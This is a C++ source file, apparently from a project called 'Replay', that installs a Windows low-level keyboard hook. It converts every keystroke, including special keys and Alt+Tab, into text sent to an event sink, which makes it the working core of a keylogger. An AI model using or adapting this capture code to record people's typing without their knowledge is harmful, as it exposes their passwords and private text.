#include "user_input_event_source.h"
#include <cassert>
#include <string>
#include "event_sink.h"
#include "utils/logging.h"

UserInputEventSource::~UserInputEventSource()
{
    LOG_CLASS_DEBUG("UserInputEventSource", "Destructor called in thread {}", GetCurrentThreadId());
}

void UserInputEventSource::initializeSource(std::weak_ptr<EventSink> inSink)
{
    outputSink = inSink;
    if (outputSink.expired())
    {
        throw std::runtime_error(RP_ERR_INITIALIZED_WITH_NULLPTR_EVENT_SINK);
    }

    Replay::Windows::WindowsHookManager::getInstance().registerObserver<Replay::Windows::KeyboardInputObserver>(
        shared_from_this());

    LOG_CLASS_INFO("UserInputEventSource", "Successfully installed keyboard hook");
}

void UserInputEventSource::uninitializeSource()
{
    LOG_CLASS_DEBUG("UserInputEventSource", "Uninitializing in thread {}", GetCurrentThreadId());
    Replay::Windows::WindowsHookManager::getInstance().unregisterObserver<Replay::Windows::KeyboardInputObserver>(
        shared_from_this());
    LOG_CLASS_INFO("UserInputEventSource", "Successfully uninstalled keyboard hook");
}

bool handleSpecialKey(int vkCode, EventSink* outputSink)
{
    switch (vkCode)
    {
    case VK_RETURN:
        *outputSink << "[ENTER]";
        break;
    case VK_BACK:
        *outputSink << "[BACKSPACE]";
        break;
    case VK_LCONTROL:
        *outputSink << "[LCTRL]";
        break;
    case VK_LSHIFT:
        *outputSink << "[LSHIFT]";
        break;
    case VK_RSHIFT:
        *outputSink << "[RSHIFT]";
        break;
    case VK_SPACE:
        *outputSink << "[SPACE]";
        break;
    case VK_CAPITAL:
        *outputSink << "[CAPSLOCK]";
        break;
    default:
        return false;
    }
    return true;
}

void UserInputEventSource::onKeyboardInput(Replay::Windows::KeyboardInputEventData eventData)
{
    auto lockedSink = outputSink.lock();
    assert(lockedSink != nullptr &&
           "UserInputEventSource::onKeyboardInput ran, but outputSink was nullptr. This should "
           "never happen, as the outputSink should be set to a valid EventSink when the hook is installed.");

    if (eventData.nCode == HC_ACTION)
    {
        // lParam is a pointer to a KBDLLHOOKSTRUCT
        KBDLLHOOKSTRUCT* pKeyboard = reinterpret_cast<KBDLLHOOKSTRUCT*>(eventData.lParam);

        // Handle keyup down events
        if (eventData.wParam == WM_KEYDOWN || eventData.wParam == WM_SYSKEYDOWN)
        {
            // Check for ALT+TAB combo
            if (pKeyboard->vkCode == VK_LMENU)
            {
                leftAltPressed = true;
            }
            else if (pKeyboard->vkCode == VK_TAB)
            {
                // If we press tab and alt isnt pressed, then TAB+ALT was entered, not
                // ALT+TAB, so we should just log out tab by itself and leave it as
                // false
                if (!leftAltPressed)
                {
                    *lockedSink << "[TAB]";
                    tabPressed = false;
                }
                else
                {
                    tabPressed = true;
                }
            }

            // Handle ALT+TAB
            if (leftAltPressed && tabPressed)
            {
                *lockedSink << "[ALT+TAB]";
            }
            // Handle special key or everything else
            else if (!handleSpecialKey(pKeyboard->vkCode, lockedSink.get()))
            {
                // If we get here and alt is pressed, that means that left alt was/is
                // pressed, and the key that followed it was not TAB, so we'll just
                // treat it as another combination (this is scuffed)
                if (leftAltPressed)
                {
                    *lockedSink << "[ALT]";
                }

                wchar_t unicodeBuffer[2] = {0};
                static BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);

                // Check if shift key is currently pressed
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                {
                    keyboardState[VK_SHIFT] |= 0x80;
                }
                // Check if caps lock is on (low order bit indicates whether or not key
                // is toggled)
                if (GetKeyState(VK_CAPITAL) & 0x0001)
                {
                    keyboardState[VK_CAPITAL] |= 0x01;
                }

                // Check if the key is a "typable" character
                if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x39) || // Numbers
                    (pKeyboard->vkCode >= 0x41 && pKeyboard->vkCode <= 0x5A) || // Letters
                    (pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_3) ||
                    (pKeyboard->vkCode >= VK_OEM_4 && pKeyboard->vkCode <= VK_OEM_7))
                {
                    // Convert the input to unicode character (need to do this since the
                    // input can change based on kbd state and the keyboard layout)
                    int i = 0;
                    int len = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0);

                    // iswprint checks if this is printable ascii character.
                    // printing control characters (this is rlly bad code fix this soon)
                    while (i < len && iswprint(unicodeBuffer[i]))
                    {
                        i++;
                    }

                    // If all of the chars were printable, then send them to output sink
                    if (i == len)
                    {
                        *lockedSink << unicodeBuffer;
                    }
                }
            }
        }
        else if (eventData.wParam == WM_KEYUP || eventData.wParam == WM_SYSKEYUP)
        {
            if (pKeyboard->vkCode == VK_LMENU)
            {
                leftAltPressed = false;
            }
            else if (pKeyboard->vkCode == VK_TAB)
            {
                tabPressed = false;
            }
        }
    }
}
